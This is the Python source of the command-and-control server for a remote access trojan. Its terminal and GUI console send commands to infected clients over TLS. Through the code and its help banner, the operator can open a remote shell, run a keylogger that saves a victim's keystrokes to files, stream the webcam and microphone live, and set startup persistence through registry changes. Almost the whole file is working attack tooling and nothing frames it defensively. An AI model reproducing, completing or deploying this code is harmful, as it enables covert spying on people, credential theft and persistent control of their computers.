import asyncio
import threading
import ipaddress
import ssl
import os
import customtkinter
import cv2
import numpy as np
import pyaudio
import tkinter
import tkinter as tk
from tkinter import ttk
class Command_Center():
    def __init__(self,IP : str ,PORT : int ,MODE : str) -> None:
        self.IP = IP
        self.PORT = PORT
        self.OS = os.name
        self.MODE = MODE
        self.Clients = []
        self.Server = None
        self.server_thread = None
        self.status = False
        self.status_shell = False
        self.status_camera = False
        self.status_mic = False
        self.frame = None
        self.BuffSize = 100000000
        self.buffer_mic = None
        self.lines_gui = 0
        self.entry_status = False
        self.current_client_index = None
        self.buttons_clients = []
        self.status_keylogger = False
        self.HELP = '''
        Help banner - Commands

        help -> to show this banner

        info -> to view server information

        vars -> to view variables of the server

        list -> list connected clients and their indexes

        del (INDEXCLIENT)-> remove a client
        
        set (IP | PORT) (VALUE)-> modify your IP and PORT


        send  (INDEXCLIENT) (COMMAND) -> to send a remote command to a client :
            Possible commands
                info      -> show information of a Client
                autocon   -> if the server is stopped the client will try to connect again and again
                keylogger -> create a file with the ip address of the client and log the keys pressed by the client.
                camera    -> activate a camera if available (q to exit not Q)
                mic       -> activate a microphone if available (q to exit not Q)
                persist   -> modify the registers in the startup for start the client
                shell     -> get a shell in the system

        stop -> stop the server
        
        start -> start the server

        cls | clear -> clear the display
        '''
    def start_server(self):
        if not self.check_addr():
            self.PrintSmart('\n[-] Check your Ip and Port')
            return
        self.status = True
        self.server_thread = threading.Thread(target=self.server_main_function,daemon=True)
        self.server_thread.start()

    def start_terminal(self):
        try:
            asyncio.run(self.terminal_interface(None))
        except KeyboardInterrupt:
            pass
    async def terminal_main_function(self):
        await self.terminal_interface()
    
    def start_GUI(self):
        asyncio.run(self.Graphic_Interface())

    def server_main_function(self):
        asyncio.run(self.main_server())

    async def main_server(self):
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain(certfile="server.cer", keyfile="server.key")
        self.Server = await asyncio.start_server(self.handle_connection, self.IP, int(self.PORT),ssl=context)
        addr = self.Server.sockets[0].getsockname()
        self.PrintSmart(f'\n[+] Serving on {addr}')

        async with self.Server:
            try:
                await self.Server.serve_forever()
            except asyncio.CancelledError :
                self.PrintSmart('\n[-] Server Closed')
    
    async def handle_connection(self,reader, writer):
        client_address = writer.get_extra_info('peername')
        if self.MODE == 'graphic':
            button = tk.Button(self.button_frame, text=f'{client_address}', command=lambda: self.GetClientIndexGUI(client_address))
            self.buttons_clients.append(button)
            button.pack(fill=tk.X)
        self.PrintSmart(f'\n[+] New connection from {client_address}')
        self.Clients.append(writer)

        while True:
            try:
                data = await reader.read(self.BuffSize)
                if not data:
                    self.PrintSmart(f'\n[-] Client disconnected: {client_address}')
                    break
                elif data.decode(errors='ignore') == 'mic':
                    self.status_mic = False
                    continue
                elif data.decode(errors='ignore') == 'shell':
                    self.status_shell = False
                    continue
                elif data.decode(errors='ignore') == 'keylogger':
                    self.status_keylogger = False
                    continue
                
                
                if self.status_shell == True:
                    self.PrintSmart(data.decode( errors='ignore'))
                    continue
                elif self.status_camera == True:
                    while self.status_camera:
                        try:
                            size_data = await asyncio.wait_for(reader.readexactly(4),2)
                            if not size_data is None and size_data.decode(errors='ignore') == 'exit':
                                self.status_camera = False
                                self.PrintSmart('\n[-] no cameras available')
                                break
                            size = int.from_bytes(size_data, 'big')
                            data = await asyncio.wait_for(reader.readexactly(size),2)
                            if not data is None and data.decode(errors='ignore') == 'exit':
                                self.PrintSmart('\n[-] no cameras available')
                                self.status_camera = False
                                break
                            ndarray = cv2.imdecode(np.frombuffer(data, np.uint8), cv2.IMREAD_COLOR)
                            umat = np.array(ndarray,dtype=np.uint8)
                            self.frame = cv2.UMat(np.array(umat, dtype=np.uint8))
                            continue
                        except:
                            self.frame = None
                            continue
                    continue
                elif self.status_mic == True:
                    self.buffer_mic = data
                    continue
                elif self.status_keylogger == True:
                    with open(f'{client_address}_logger.txt','a') as f:
                        f.write(data.decode(errors='ignore'))
                        f.close()
                    continue                    
                msg = data.decode(errors='ignore')
                self.PrintSmart(f'\n[+] Received from {client_address} : {msg}')
                if self.status_keylogger == True:
                    self.status_keylogger = False
            except (ConnectionResetError, BrokenPipeError,OSError):
                if self.status_keylogger == True:
                    self.status_keylogger = False
                self.PrintSmart(f'\n[-] Client disconnected: {client_address}')
                break
        self.Clients.remove(writer)
        writer.close()
        if self.MODE == 'graphic':
            button.destroy()
            

    async def terminal_interface(self,command):
        while True:
            if self.MODE == 'terminal':
                try:
                    command = input('\ncommand << ')
                except (EOFError,KeyboardInterrupt):
                    if self.status == True:
                        await self.CloseServer()
                    break
            if command == 'help':
                self.PrintSmart(self.HELP)
            elif command.startswith('send'):
                if self.status == True:
                    if  len(command.split()) == 3:
                        _, index ,msg= command.split()
                        try:
                            index = int(index)

                            if msg == 'keylogger' and  self.status_keylogger == False:
                                self.status_keylogger = True
                                self.Clients[index].write(bytes(msg,'utf-8'))
                                await  self.Clients[index].drain()
                                address = self.Clients[index].get_extra_info('peername')
                                with open(f'{address}_logger.txt','w') as f:
                                    f.close()
                                if self.MODE == 'graphic':
                                    self.entry_status = False
                                    return
                            elif msg == 'keylogger' and  self.status_keylogger == True:
                                self.PrintSmart('[-] Keylogger is running in a Client')
                                if self.MODE == 'graphic':
                                    self.entry_status = False
                                    return
                            elif self.status_keylogger == True and msg != 'exit':
                                self.PrintSmart('[-] Keylogger is running in a Client')
                                continue
                            if msg == 'shell':
                                self.status_shell = True
                                if self.MODE == 'graphic':
                                    self.Clients[index].write(bytes('shell','utf-8'))
                                    await self.Clients[index].drain()
                                    self.command_gui = None
                                    self.current_client_index = index
                                    return
                                self.Clients[index].write(bytes('shell','utf-8'))
                                await self.Clients[index].drain()
                                await self.GetShell(index)
                                continue
                            elif msg == 'camera':
                                self.status_camera = True
                                self.Clients[index].write(bytes('camera','utf-8'))
                                await self.Clients[index].drain()
                                await self.GetCamera(index)
                                if self.MODE == 'graphic':
                                    self.entry_status = False
                                    return
                                continue
                            elif msg == 'mic':
                                self.status_mic = True
                                self.Clients[index].write(bytes('mic','utf-8'))
                                await self.Clients[index].drain()
                                await self.GetMic(index)
                                if self.MODE == 'graphic':
                                    self.entry_status = False
                                    return
                                continue
                            else:
                                self.Clients[index].write(bytes(msg,'utf-8'))
                                await  self.Clients[index].drain()
                        except IndexError:
                            self.PrintSmart('[-] Unknown Client Index\n')
                        except ValueError:
                            self.PrintSmart('[-] Bad Index\n')
                        except:
                            await self.GetShell(index)
                            continue
                    else:
                        self.PrintSmart('[-] Missing Arguments : set INDEXCLIENT MSG')
                else:
                    self.PrintSmart('[-] The Server is Down')
            elif command.startswith('set'):
                if self.status == False:
                    if  len(command.split()) == 3:
                        _, var , value = command.split(' ')
                        if var == 'IP':
                            self.IP = value
                        elif var == 'PORT':
                            self.PORT = value
                        else:
                            self.PrintSmart(f'[-] This variable {var} does not exist or cannot be changed')
                    else:
                        self.PrintSmart('[-] Missing Arguments : set VARNAME VALUE')
                else:
                    self.PrintSmart('[-] The Server is Running')
            elif command.startswith('del'):
                if self.status == True:  
                    if  len(command.split()) == 2:
                        _, index = command.split(' ')
                        index = int(index)
                        try:
                            # self.PrintSmart('[+] Client removed ' + str(self.Clients[index].get_extra_info('peername')))
                            self.Clients[index].close()
                        except IndexError:
                            self.PrintSmart('[-] Unknown Client Index')
                        
                    else:
                        self.PrintSmart('[-] Missing Arguments : set INDEXCLIENT')
                else:
                    self.PrintSmart('[-] The Server is Down')
            elif command == 'vars':
                self.PrintSmart(f'MODE={self.MODE}')
                self.PrintSmart(f'IP={self.IP}')
                self.PrintSmart(f'PORT={self.PORT}')
                self.PrintSmart(f'OS={self.OS}')
                self.PrintSmart(f'CLIENTS={self.Clients}')
                self.PrintSmart(f'STATUS={self.status}')
                self.PrintSmart(f'SERVER={self.Server}')
                self.PrintSmart(f'SHELL={self.status_shell}')
                self.PrintSmart(f'CAMERA={self.status_camera}')
                self.PrintSmart(f'MIC={self.status_mic}')
                self.PrintSmart(f'KEYLOGGER={self.status_keylogger}')
                self.PrintSmart(f'CURRENT CLIENT INDEX={self.current_client_index}')
                self.PrintSmart(f'LINES_GUI={self.lines_gui}')
                self.PrintSmart(f'ENTRY_STATUS={self.entry_status}')
            elif command == 'info':
                self.PrintSmart(f'IP : {self.IP} , PORT : {self.PORT} , RUNNING : {self.status}')
            elif command == 'list':
                for i in range(len(self.Clients)):
                    self.PrintSmart(f'{i} :' + str(self.Clients[i].get_extra_info('peername')))
            elif command == 'start':
                if self.status == False:
                    self.start_server()
                else:
                    self.PrintSmart('[-] The Server is Running')
            elif command == 'stop':
                if self.status == True:
                    await self.CloseServer()
                    self.PrintSmart('[+] Stopping the server')
                else:
                    self.PrintSmart('[-] The Server is Down')
            elif (command == 'clear' or command == 'cls') and self.MODE == 'terminal':
                if os.name == 'posix':
                    os.system('clear')
                else:
                    os.system('cls')
            elif (command == 'quit' or command =='exit') and self.MODE == 'terminal':
                self.PrintSmart('\nPress Control +c  to exit')
            elif (command == 'cls' or command == 'clear') and self.MODE == 'graphic':
                self.console.configure(state="normal")
                self.console.delete('1.0',tkinter.END)
                self.console.configure(state="disable")
                self.lines_gui = 0
                self.entry_status = False
            elif self.MODE == 'graphic':
                self.PrintSmart('[-] Error Command')
                
            if self.MODE == 'graphic':
                self.entry_status = False
                break
    def ButtonStart(self):
        if self.status == False:
            self.Button_start_stop.configure(text='STOP SERVER')
            self.start_server()
        else:
            self.Button_start_stop.configure(text='START SERVER')
            self.CloseServer_notAsync()
            self.current_client_index = None

    def input_command_gui(self,event):
        async def send_command_shell():
            try:
                self.Clients[self.current_client_index].write(bytes(self.command_gui,'utf-8'))
                await  self.Clients[self.current_client_index].drain()
            except IndexError:
                self.entry_status = False
                self.status_shell = False
                return
        self.command_gui = self.input_command.get()

        if self.status_shell == False:
            self.PrintSmart('command << ' + self.command_gui)
        
        if self.entry_status == False:
            self.entry_status = True
            asyncio.run(self.terminal_interface(self.command_gui))
        elif self.status_shell == True:
            if self.command_gui == 'exit':
                self.status_shell = False
                self.entry_status = False
                self.command_gui = 'exit'
            asyncio.run(send_command_shell())
        self.input_command.delete(0,10000)
    def update_scroll_region(self,event):
        self.canvas.configure(scrollregion=self.canvas.bbox("all"))
    def GetClientIndexGUI(self,client_address):
        for i in range(len(self.Clients)):
            if self.Clients[i].get_extra_info('peername') == client_address:
                self.current_client_index = i
                break
        self.console_frame.set('current client')
    def ButtonsCurrentClient(self,opt):
        if len(self.Clients) == 0:
            self.current_client_index = None
        if self.current_client_index is None:
            self.console_frame.set('console')
            self.PrintSmart('[-] there are no Client Selected')
            return
        if opt == 'shell' and self.status_shell == False and self.status_keylogger == False:
            self.PrintSmart('[+] Wait for the shell ...')
            self.console_frame.set('console')
            self.entry_status = True
        elif opt == 'keylogger' and self.status_keylogger == False and self.status_shell == False:
            self.console_frame.set('console')
            self.PrintSmart('[+] keylogger activated')
            self.PrintSmart('send (INDEXCLIENT) exit - to stop keylogger')
        elif opt == 'keylogger' and self.status_keylogger == True and self.status_shell == False:
            self.console_frame.set('console')
            self.PrintSmart('[-] keylogger is running')
            return
        elif (opt == 'autocon' or opt == 'info' or opt == 'persist') and self.status_keylogger == False and self.status_shell == False:
            self.console_frame.set('console')
        elif opt == 'del' and self.status_keylogger == False and self.status_shell == False:
            self.console_frame.set('console')
            asyncio.run(self.terminal_interface(f'del {self.current_client_index}'))
            return
        elif self.status_shell == True:
            self.console_frame.set('console')
            self.PrintSmart('[-] Shell is activated')
            return
        elif self.status_keylogger == True:
            self.console_frame.set('console')
            self.PrintSmart('[-] Keylogger is running in a client')
            return
        asyncio.run(self.terminal_interface(f'send {self.current_client_index} ' + opt))
    def Graphic_Interface(self):
        self.app = customtkinter.CTk()
        # configure window
        self.app.geometry(f"{1100}x{580}")
        customtkinter.set_appearance_mode('dark')
        self.app.title('Command Center')
        self.app.geometry('1000x600')
        self.app.resizable(False,False)
        
        #add buttons
        self.IPBOX = customtkinter.CTkLabel(self.app,text=f'IP:{self.IP}')
        self.PORTBOX = customtkinter.CTkLabel(self.app,text=f'PORT:{self.PORT}')

        self.scrollbar = ttk.Scrollbar(self.app, orient="vertical")
        self.scrollbar.place(x=170,y=160)
        self.canvas = tk.Canvas(self.app, yscrollcommand=self.scrollbar.set,width=135,height=200,bg='#000000')
        self.canvas.place(x=30,y=100)

        
        self.button_frame = tk.Frame(self.canvas,bg='#000000')
        self.canvas.create_window((0, 0), window=self.button_frame, anchor='nw')


        self.button_frame.bind("<Configure>", self.update_scroll_region)
        self.scrollbar.config(command=self.canvas.yview)
        
        self.console_frame = customtkinter.CTkTabview(
            self.app, 
            corner_radius=5,
            width=500,
            height=450,
        )
        self.console_frame.add('console')
        self.console_frame.add('current client')

        self.input_command = customtkinter.CTkEntry(
            self.app,
            width=500,
            height=5,
            placeholder_text='Type a command'
            )
        self.Button_start_stop = customtkinter.CTkButton(
            self.app,
            text='START SERVER',
            command=self.ButtonStart
            )
        self.console = customtkinter.CTkTextbox(
            self.console_frame.tab('console'), 
            corner_radius=5,
            width=490,
            height=400,
            wrap='word'
        )

        self.Button_Camera = customtkinter.CTkButton(
            self.console_frame.tab('current client'),
            text='Camera',
            command=lambda:self.ButtonsCurrentClient('camera')
        )
        self.Button_Mic = customtkinter.CTkButton(
            self.console_frame.tab('current client'),
            text='Microphone',
            command=lambda:self.ButtonsCurrentClient('mic')
        )
        self.Button_Shell = customtkinter.CTkButton(
            self.console_frame.tab('current client'),
            text='Shell',
            command=lambda:self.ButtonsCurrentClient('shell')
        )
        self.Button_AUTOCON = customtkinter.CTkButton(
            self.console_frame.tab('current client'),
            text='AUTOCON',
            command=lambda:self.ButtonsCurrentClient('autocon')
        )
        self.Button_KEYLOGGER = customtkinter.CTkButton(
            self.console_frame.tab('current client'),
            text='KEYLOGGER',
            command=lambda:self.ButtonsCurrentClient('keylogger')
        )
        self.Button_INFO = customtkinter.CTkButton(
            self.console_frame.tab('current client'),
            text='INFO',
            command=lambda:self.ButtonsCurrentClient('info')
        )
        self.Button_DEL = customtkinter.CTkButton(
            self.console_frame.tab('current client'),
            text='DELETE',
            command=lambda:self.ButtonsCurrentClient('del')
        )
        self.Button_PERSIST = customtkinter.CTkButton(
            self.console_frame.tab('current client'),
            text='PERSIST',
            command=lambda:self.ButtonsCurrentClient('persist')
        )
        
        #config buttons
        self.input_command.bind(
            '<Return>',
            self.input_command_gui
        )

        
        #draw buttons
        self.IPBOX.place(x=780,y=80)
        self.PORTBOX.place(x=870,y=80)
        self.console_frame.place(x=200,y=50)
        self.console.place(x=0,y=0)
        self.input_command.place(x=200,y=520)
        self.Button_start_stop.place(x=790,y=20)
        self.Button_Mic.place(x=20,y=20)
        self.Button_Camera.place(x=300,y=20)
        self.Button_Shell.place(x=20,y=90)
        self.Button_AUTOCON.place(x=300,y=90)
        self.Button_KEYLOGGER.place(x=20,y=170)
        self.Button_INFO.place(x=300,y=170)
        self.Button_DEL.place(x=20,y=250)
        self.Button_PERSIST.place(x=300,y=250)
        #start GUI
        self.app.mainloop()
            
        
    def check_addr(self):
        if self.PORT == None or self.IP == None:
            return False
        
        if not self.PORT.isdigit() or  not int(self.PORT) >= 1 or not int(self.PORT) <= 6535:
            self.PrintSmart(f'\n[-]Invalid Port {self.PORT}')
            return False

        try:
            ipaddress.ip_address(self.IP)
        except ValueError:
            self.PrintSmart(f'\n[-]Invalid IP {self.IP}')
            return False
        return True

    async def GetCamera(self,index):
        try:
            if self.MODE == 'graphic':
               self.app.attributes("-disabled", True)
            if not self.MODE == 'graphic':
                self.PrintSmart('\nWait a moment please.....')
                self.PrintSmart('\nPress q to exit')
            while self.status_camera:
                if not self.frame is None:
                    cv2.imshow('Frame', self.frame)
                    self.frame = None
                if cv2.waitKey(1) & 0xFF == ord('q'):
                    self.status_camera = False
                    self.Clients[index].write(b'exit')
                    await self.Clients[index].drain()
                    cv2.destroyAllWindows()
                    if self.MODE == 'graphic':
                        self.app.attributes("-disabled", False)
                        self.console_frame.set('console')    
                    break
            if self.MODE == 'graphic':
                self.app.attributes("-disabled", False)
                self.console_frame.set('console')    
        except KeyboardInterrupt:
            self.status_shell = False
            self.Clients[index].write(b'exit')
            await self.Clients[index].drain()
            cv2.destroyAllWindows()
            return
        except:
            self.status_camera = False
            cv2.destroyAllWindows()
            if self.MODE == 'graphic':
                self.app.attributes("-disabled", False)
                self.console_frame.set('console') 
            return

    async def GetShell(self,index):
        while self.status_shell:
            await asyncio.sleep(2)
            try:
                if self.MODE == 'terminal':
                    shellcommand = input()
                elif self.MODE == 'graphic':
                    return
            except (EOFError,KeyboardInterrupt):
                break
            if shellcommand == 'exit':
                self.Clients[index].write(bytes(shellcommand,'utf-8'))
                await  self.Clients[index].drain()
                self.PrintSmart('[-] Shell Closed\n')
                break
            elif len(shellcommand) == 0:
                self.Clients[index].write(bytes('ENTERCOMMAND','utf-8'))
                await  self.Clients[index].drain()
                continue 
            self.Clients[index].write(bytes(shellcommand,'utf-8'))
            await  self.Clients[index].drain()

        if self.status_shell:
            self.status_shell = False
            return

    async def GetMic(self,index):
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        p = pyaudio.PyAudio()
        stream = p.open(
                format=FORMAT,
                channels=CHANNELS,
                rate=RATE,
                output=True,
                frames_per_buffer=CHUNK
        )

        stream.start_stream()

        if not self.MODE == 'graphic':
            self.PrintSmart('\n[+] Recording')

            self.PrintSmart('\nControl + c to stop IMPORTANT:(try one or two | no more)')

            self.PrintSmart('\nwait a moment please')

        if self.MODE == 'graphic':
            self.app.attributes("-disabled", True)
        try:
            frame = np.zeros((512, 512, 1), dtype = "uint8")
            while self.status_mic:
                if not self.buffer_mic is None:
                    stream.write(self.buffer_mic)
                    self.buffer_mic = None
                
                cv2.imshow('Frame',frame )
                if cv2.waitKey(1) & 0xFF == ord('q'):
                    self.status_mic = False
                    self.Clients[index].write(b'exit')
                    await self.Clients[index].drain()
                    cv2.destroyAllWindows()
                    if self.MODE == 'graphic':
                        self.app.attributes("-disabled", False)    
                    break
            cv2.destroyAllWindows()
            if self.MODE == 'graphic':
                self.app.attributes("-disabled", False)
                self.console_frame.set('console')
        except KeyboardInterrupt:
            stream.stop_stream()
            self.Clients[index].write(b'exit')
            await self.Clients[index].drain()
            self.status_mic = False
        except:
            self.status_camera = False
            cv2.destroyAllWindows()
            if self.MODE == 'graphic':
                self.app.attributes("-disabled", False)
                self.console_frame.set('console') 
            return

    def PrintSmart(self,txt):
        if self.MODE == 'terminal':
            if self.status_shell == True:
                print(txt,end='')
            else:
                print(txt)
        elif self.MODE == 'graphic':
            try:
                lines = txt.count('\n')
                self.console.configure(state='normal')
                self.console.insert(f'{self.lines_gui}.0',txt + '\n')
                self.console.configure(state='disable')
                self.lines_gui = self.lines_gui + lines + 2
                self.input_command.delete(0,10000)
                self.console.see(tk.END)
            except AttributeError:
                print(txt)

    async def CloseServer(self):
        self.status = False
        for client in self.Clients:
            client.close()
            #await client.wait_closed()
        self.Server.close()
    
    def CloseServer_notAsync(self):
        self.status = False
        for button in self.buttons_clients:
            button.destroy()

        for client in self.Clients:
            client.close()
            #await client.wait_closed()
        self.Server.close()
        
